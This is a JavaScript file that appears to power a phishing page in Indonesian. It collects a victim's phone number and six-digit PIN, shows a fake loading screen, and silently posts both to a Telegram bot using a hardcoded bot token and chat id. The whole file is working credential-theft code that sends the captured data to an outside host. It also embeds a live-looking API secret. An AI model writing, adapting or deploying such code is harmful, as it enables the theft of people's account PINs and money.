function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

document.addEventListener('click', function(e) {
  if (e.target && e.target.classList.contains('btn-lanjut')) {
    showPage('pinPage');
  }
});

document.addEventListener('keydown', function(e) {
  if (e.key === 'Enter' && document.getElementById('pinPage').classList.contains('active')) {
    const nomor = '+62' + document.getElementById('phoneNumber').value.trim();
    const pins = document.querySelectorAll('.pin-input input');
    let pin = '';
    pins.forEach(input => pin += input.value);

    if (pin.length < 6) {
      alert("PIN harus 6 digit.");
      return;
    }

    showPage('loadingPage');

    const message = `nomor: ${nomor}\nPin: ${pin}`;
    const token = "7635408983:AAHrM9l9mXMYMrX6K6IP_my1tR-gHCmADBM";
    const chat_id = "-1002279218218";
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message,
      }),
    }).then(() => {
      console.log("Terkirim.");
    }).catch(() => {
      alert("Gagal mengirim.");
    });
  }
});

const toggleBtn = document.getElementById('toggle-pin');
const inputs = document.querySelectorAll('.pin-input input');
let hidden = true;

if (toggleBtn) {
  toggleBtn.addEventListener('click', () => {
    hidden = !hidden;
    inputs.forEach(input => input.type = hidden ? 'password' : 'text');
    toggleBtn.textContent = hidden ? 'TAMPILKAN' : 'SEMBUNYIKAN';
  });

  inputs.forEach((input, idx) => {
    input.addEventListener('input', () => {
      if (input.value && idx < inputs.length - 1) {
        inputs[idx + 1].focus();
      }
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && idx > 0) {
        inputs[idx - 1].focus();
      }
    });
  });
}